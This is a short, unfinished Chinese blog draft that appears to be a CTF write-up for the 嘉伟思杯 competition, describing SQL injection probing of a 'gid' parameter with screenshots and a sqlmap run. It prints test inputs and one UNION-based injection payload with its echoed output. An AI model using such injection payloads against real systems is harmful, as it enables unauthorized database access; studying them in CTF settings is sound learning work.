---
title: '嘉伟思杯-ctf'
date: 2019-01-01
category: '心路历程'
tags: []
lang: 'zh'
draft: true
---
# 第一道
![](https://upload-images.jianshu.io/upload_images/10651191-e0e261917ce26d70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![](https://upload-images.jianshu.io/upload_images/10651191-4775c0377adc8b44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

输入1 能查询到相关的信息
![](https://upload-images.jianshu.io/upload_images/10651191-4d0418a359b666ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

1’ 会报错

![](https://upload-images.jianshu.io/upload_images/10651191-e6e8b342e5068373.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

然而输入 1 and 1=1不会有错

输入 1’--+会报错

![详细的报错信息](https://upload-images.jianshu.io/upload_images/10651191-4bce2d21c1dd8d7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

如果是111 会报错， 无此数据

如果是这样可以成功地回显数据
![image.png](https://upload-images.jianshu.io/upload_images/10651191-ff0457f43181557d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![sqlmap跑一下](https://upload-images.jianshu.io/upload_images/10651191-f0e01f106120ae44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

获得了一个payload :gid=111' UNION ALL SELECT NULL,NULL,CONCAT(0x716b706271,0x49444d434e6a53476b536c52757363416b53437352416c4f516f41416c426566514f5a5450696c64,0x7176706a71),NULL#

然后回显了一些信息

![](https://upload-images.jianshu.io/upload_images/10651191-03762403b722abba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

> qkpbqIDMCNjSGkSlRuscAkSCsRAlOQoAAlBefQOZTPildqvpjq	

![patload](https://upload-images.jianshu.io/upload_images/10651191-6691a2e4b819d267.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
看到了这个错误

![](https://upload-images.jianshu.io/upload_images/10651191-920612dddef2bd0f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

> qkpbq1qvpjq1
